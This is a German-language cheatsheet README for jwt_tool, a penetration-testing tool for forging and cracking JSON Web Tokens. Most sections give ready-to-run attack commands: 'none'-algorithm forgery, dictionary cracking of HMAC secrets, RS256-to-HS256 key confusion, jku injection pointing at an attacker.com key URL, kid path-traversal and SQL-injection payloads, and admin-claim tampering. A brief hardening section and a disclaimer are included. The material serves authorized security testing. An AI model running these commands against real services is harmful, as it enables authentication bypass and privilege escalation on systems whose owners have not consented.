<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪙 jwt_tool – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        All-in-One JSON Web Token Manipulation & Exploitation Suite
```
<p align="center">
  <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🪙 Leistungsstarkes Python-CLI-Toolkit zum Analysieren, Manipulieren, Fälschen, Scannen und Knacken von JSON-Web-Tokens (JWT)</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Übersicht & JWT-Anatomie](#-overview--jwt-anatomy)
- [Installation](#-Installation)
- [Token-Parsing und -Inspektion](#-token-parsing--inspection)
- [Automatisiertes Schwachstellen-Scanning (`-M at`)](#-automated-vulnerability-scanning--m-at)
- [Häufige Ausbeutungsszenarien](#-common-exploitation-scenarios)
  - [Algorithmusverwirrung / Kein Angriff (`none`)](#algorithm-confusion--none-attack-none)
  - [HMAC Secret Key Cracking](#hmac-secret-key-cracking)
  - [Schlüsselverwirrung: RS256 zu HS256 mit öffentlichem Schlüssel](#key-confusion-rs256-to-hs256-with-public-key)
  - [Header-Injection: JKU-, X5U- und JWK-Spoofing](#header-injection-jku-x5u--jwk-spoofing)
  - [KID-Injection (SQLi & Path Traversal)](#kid-injection-sqli--path-traversal)
- [Ansprüche wegen Nutzlastmanipulation und -fälschung](#-payload-tampering--forging-claims)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und Härtung](#-defensive-überlegungen--härtung)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Übersicht & JWT-Anatomie

Ein JSON-Web-Token (RFC 7519) besteht aus drei Base64URL-codierten Segmenten, die durch Punkte (`.`) getrennt sind:
`header.payload.signature`

1. **Header:** Identifiziert den Token-Typ (`typ`) und den Signaturalgorithmus (`alg`, z. B. `HS256`, `RS256`, `none`).
2. **Nutzlast:** Enthält Benutzeransprüche (`sub`, `role`, `admin`, `exp`).
3. **Signatur:** Kryptografischer Verifizierungs-Hash, der clientseitige Manipulationen verhindert.

**jwt_tool** wurde von **ticarpi** entwickelt und automatisiert Tests auf Architektur- und Implementierungsfehler in JWT-Authentifizierungsworkflows über APIs und moderne Webanwendungen hinweg.

---

## 📥 Installation
```bash
# Clone the repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip install -r requirements.txt

# Run jwt_tool
python3 jwt_tool.py --help
```
---

## 🔍Token-Analyse und -Inspektion

Header-Parameter und Nutzlastansprüche dekodieren und prüfen:
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```
---

## ⚡ Automatisiertes Schwachstellenscannen (`-M at`)

Starten Sie automatisierte Playbook-Scans, um bekannte Schwachstellen gegenüber einem Ziel-Webdienst zu testen:
```bash
# Run All Tests (-M at) sending requests to web endpoint
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*Durchgeführte Tests:*
- Signaturentfernung (Keine Algorithmusvarianten)
- RSA-zu-HMAC-Schlüsselverwirrung
– Anspruch auf Manipulation (`admin=true`, Privilegieneskalation)
- Einspritzung in die Header `kid`, `jku`, `x5u`
- Handhabung leerer Signaturen

---

## 💥 Häufige Ausbeutungsszenarien

### Algorithmusverwirrung / Kein Angriff (`none`)
Wenn Backend-Implementierungen unsignierte Token akzeptieren:
```bash
# Forge token with 'none' algorithm and stripped signature
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*Automatisch getestete Varianten:* `none`, `None`, `NONE`, `nOnE`.

### Knacken des geheimen HMAC-Schlüssels
Wenn HS256/HS384/HS512 eine schwache Passphrase verwendet:
```bash
# Dictionary attack using rockyou.txt
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```
### Schlüsselverwirrung: RS256 zu HS256 mit öffentlichem Schlüssel
Wenn der Server mit RSA (RS256) signiert, aber HMAC (HS256) akzeptiert und sein öffentliches Zertifikat als gemeinsam genutzten HMAC-Schlüssel verwendet:
```bash
# Forge token using server public key file
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```
### Header-Injection: JKU-, X5U- und JWK-Spoofing
Einschleusen von vom Angreifer kontrollierten Schlüsseln oder URLs:
```bash
# Inject attacker-controlled JWKS URL in jku header
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
```
### KID-Injection (SQLi & Path Traversal)
Wenn das Backend den Header-Parameter `kid` (Schlüssel-ID) direkt in Datenbankabfragen oder Dateipfaden verwendet:
```bash
# Path traversal pointing to /dev/null (empty secret)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection in kid header to bypass signature verification
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
```
---

## ✍️ Ansprüche wegen Nutzlastmanipulation und Fälschung

Ändern Sie bestimmte Anspruchswerte und geben Sie das Token zurück:
```bash
# Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "secret_key"
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **Token dekodieren und analysieren** | `python3 jwt_tool.py <JWT>` |
| **All-in-One-Playbook-Scan** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **Das HMAC-Geheimnis knacken** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| **Mit keinem Algorithmus umgehen** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> HS256 Verwirrung** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| **Tamper Payload & Sign** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| **KID-Pfaddurchquerung** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ Defensive Überlegungen und Abhärtung

1. **Strenges Algorithmus-Whitelisting:** Akzeptieren Sie niemals `none` oder den Algorithmuswechsel. Erwartete Algorithmen explizit überprüfen (nur `RS256`).
2. **Client-gesteuerte Schlüssel ablehnen:** Vertrauen Sie `jku`-, `jwk`- oder `x5u`-Headern nicht blind von nicht vertrauenswürdigen Eingaben ohne strenge Domänen-Zulassungslisten.
3. **Verwenden Sie starke Geheimnisse:** Stellen Sie sicher, dass HMAC-Schlüssel mindestens 256 Bit kryptografischer Zufallsbytes mit hoher Entropie umfassen.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> jwt_tool ist ausschließlich für autorisierte Penetrationstests, API-Schwachstellenbewertungen und Bildungsforschung konzipiert. Das Fälschen von Token für den Zugriff auf nicht autorisierte Systeme ohne schriftliche Genehmigung ist streng illegal.